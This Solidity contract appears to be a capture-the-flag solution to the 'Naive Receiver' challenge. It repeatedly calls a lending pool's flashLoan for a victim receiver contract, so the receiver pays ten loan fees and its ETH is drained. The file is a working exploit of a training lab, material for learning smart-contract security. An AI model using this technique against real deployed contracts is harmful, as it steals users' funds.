// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttack {
    IERC3156FlashBorrower public receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes public data = "0x";
    NaiveReceiverLenderPool public pool;
    uint public constant amount = 100;

    function setReceiver(address _receiver) public {
        receiver = IERC3156FlashBorrower(_receiver);
    }

    function setPool(NaiveReceiverLenderPool _pool) public {
        pool = _pool;
    }

    function attack() external payable {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, amount, data);
        }
    }

}
